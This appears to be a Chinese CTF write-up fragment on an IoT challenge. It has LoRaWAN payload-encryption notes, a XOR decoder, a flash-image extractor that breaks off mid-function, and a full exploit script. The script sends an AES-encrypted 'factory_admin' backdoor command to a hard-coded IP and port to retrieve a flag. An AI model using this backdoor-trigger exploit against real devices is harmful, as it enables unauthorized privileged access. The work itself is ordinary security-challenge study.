FRMPayload 采用 AES128 加密。

- 算法定义了一个块序列 Ai，i 从 1 到 k，k = ceil( len( FRMPayload) / 16 )，ceil 为向上取整函数。i 是多少块数据。

  | bytes | 1    | 4         | 1   | 4       | 4                       | 1    | 1   |
  | ----- | ---- | --------- | --- | ------- | ----------------------- | ---- | --- |
  | A1    | 0x01 | 4 \* 0x00 | Dir | DevAddr | FCntUp or<br />FCntDown | 0x00 | i   |

  Dir：上行帧时为 0，在下行帧时为 1

  FCnt：FCnt 在数据帧中占 2 字节，需要补两个 0，大小端同原始数据 PHYPayload

  对 Ai 进行加密可以得到序列 S

  Si = aes128_encrypt(K, Ai) for i = 1…k

  S = S1 | S2 | … | Sk

  通过与 S 异或计算对载荷数据 FRMPayload 进行加解密

```py
import sys


def xor_0x9a(input_file, output_file):
    with open(input_file, 'rb') as f:
        data = f.read()

    decrypted = bytes(b ^ 0x9A for b in data)

    with open(output_file, 'wb') as f:
        f.write(decrypted)

    print(f"处理完成，结果已保存至: {output_file}")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("用法: python xor_decrypt.py <输入文件> <输出文件>")
        sys.exit(1)

    xor_0x9a(sys.argv[1], sys.argv[2])
```

## 我的 flash

```py
#!/usr/bin/env python3
"""
Flash Image Chunk Extractor (Non-0xFF regions only)
No deobfuscation applied - raw extraction only.
"""

import sys

def extract_non_ff_chunks(data, min_len=4):
    """Extract contiguous blocks of bytes not equal to 0xFF."""
    chunks = []
    start = None
    for i, byte in enumerate(data):
        if byte != 0xFF:
            if start is None:
                start = i
        else:
            if start is not None:
                if i - start >= min_len:
                    chunks.append((start, data[start:i]))
                start = None
    if start is not None and len(data) - start >= min_len:
        chunks.append((start, data[start:]))
    return chunks

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <flash_image.bin>")
        sys.exit(1)

    with open(sys.argv[1], "rb") as f:
        data = f.read()

    chunks = extract_non_ff_chunks(data)
    if not chunks:
        print("[!] No non-0xFF chunks found (minimum 4 bytes).")
        return

    print(f"[*] Found {len(chunks)} chunk(s):\n")
    for offset, chunk in chunks:
```

```py
#!/usr/bin/env python3
"""
T1Hub 后门利用脚本（二进制协议版）
用法：直接运行，自动连接目标并获取 Flag
"""

import json
import time
import socket
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# ---------- 协议常量 ----------
MAGIC = b'\x5A\xA5\x00\x01'           # 4 字节魔数头
KEY_STR = "X_T3ch_IoT_v2.0!"
IV_HEX  = "30313233343536373839616263646566"
TARGET_HOST = "1.95.7.68"
TARGET_PORT = 2133

# 后门参数
CMD_ID = 45372
ROLE = "factory_admin"
DEVICE_ID = "DEV_88291"

def encrypt_payload(payload_dict: dict) -> str:
    """AES-CBC 加密，返回 Base64 字符串"""
    key_bytes = KEY_STR.encode('utf-8')
    iv_bytes = bytes.fromhex(IV_HEX)

    json_str = json.dumps(payload_dict, separators=(',', ':'))
    cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)
    padded = pad(json_str.encode('utf-8'), AES.block_size, style='pkcs7')
    encrypted = cipher.encrypt(padded)
    return base64.b64encode(encrypted).decode('ascii')

def decrypt_response(b64_data: str) -> bytes:
    """解密服务端返回的 Base64 密文（与加密对称）"""
    key_bytes = KEY_STR.encode('utf-8')
    iv_bytes = bytes.fromhex(IV_HEX)

    cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)
    encrypted = base64.b64decode(b64_data)
    decrypted_padded = cipher.decrypt(encrypted)
    return unpad(decrypted_padded, AES.block_size, style='pkcs7')

def main():
    # 1. 构造后门 payload
    payload = {
        "cmd_id": CMD_ID,
        "timestamp": int(time.time() * 1000),
        "role": ROLE,
        "device_id": DEVICE_ID
    }
    print(f"[*] 构造后门命令，时间戳: {payload['timestamp']}")

    # 2. 加密得到 Base64 字符串
    enc_b64 = encrypt_payload(payload)
    print(f"[*] 密文(Base64): {enc_b64[:30]}...")

    # 3. 拼接完整数据包：二进制魔数 + Base64 文本的 UTF-8 字节
    packet = MAGIC + enc_b64.encode('utf-8') + b'\n'   # 添加换行以防服务端按行读取

    # 4. 连接目标并发送
    print(f"[*] 连接到 {TARGET_HOST}:{TARGET_PORT}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    try:
        sock.connect((TARGET_HOST, TARGET_PORT))
        sock.sendall(packet)
        print("[+] 数据包已发送，等待响应...")

        # 5. 接收响应
        response = sock.recv(4096)
        sock.close()

        if not response:
            print("[-] 未收到任何响应，连接可能被关闭")
            return

        print(f"[*] 原始响应 ({len(response)} 字节): {response[:100]}...")

        # 6. 尝试解析响应
        # 可能性1: 响应以相同魔数开头，后跟 Base64 密文
        if response.startswith(MAGIC):
            print("[*] 响应包含协议头，去除魔数后解密...")
            resp_b64 = response[4:].decode('utf-8').strip()
            plain = decrypt_response(resp_b64)
            print(f"[+] 解密后数据:\n{plain.decode('utf-8')}")
        # 可能性2: 响应就是 Base64 密文（无协议头）
        elif response.startswith(b'eyJ') or response[0] in b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/':
            print("[*] 响应看起来是纯 Base64 密文，尝试解密...")
            resp_b64 = response.decode('utf-8').strip()
            plain = decrypt_response(resp_b64)
            print(f"[+] 解密后数据:\n{plain.decode('utf-8')}")
        # 可能性3: 直接返回明文 Flag
        else:
            print(f"[*] 响应可能是明文: {response.decode('utf-8', errors='replace')}")

    except Exception as e:
        print(f"[-] 发生错误: {e}")
        sock.close()

if __name__ == "__main__":
    main()
```
